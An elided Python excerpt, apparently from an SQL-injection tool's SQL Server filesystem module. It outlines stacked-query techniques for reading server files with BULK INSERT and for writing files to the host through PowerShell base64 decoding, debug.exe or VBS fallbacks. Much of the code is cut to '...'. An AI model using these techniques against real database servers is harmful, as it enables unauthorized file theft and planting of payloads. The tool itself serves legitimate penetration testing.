...
class Filesystem(GenericFilesystem):
    ...
    def stackedReadFile(self, remoteFile):
        ...
        inject.goStacked(
            "BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s',"
            " ROWTERMINATOR='%s')" % (txtTbl, remoteFile, randomStr(10), randomStr(10)),
            silent=True,
        )
        ...
        if not result:
            ...
            for index in indexRange:
                chunk = inject.getValue(
                    "SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s"
    ...
    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
        ...
        logger.debug(
            "executing the PowerShell base64-decoding script to write the %s file,"
            " please wait.." % remoteFile
        )
    ...
    def _stackedWriteFileDebugExe(
        self, tmpPath, localFile, localFileContent, remoteFile, fileType
    ):
        ...
        if written is False:
            ...
            if readInput(message, default="Y", boolean=True):
                self._stackedWriteFileVbs(
                    tmpPath, localFileContent, remoteFile, fileType
                )
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
        ...
        if written is False:
            ...
            if readInput(message, default="Y", boolean=True):
                self._stackedWriteFileDebugExe(
                    tmpPath, localFile, localFileContent, remoteFile, fileType
                )
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
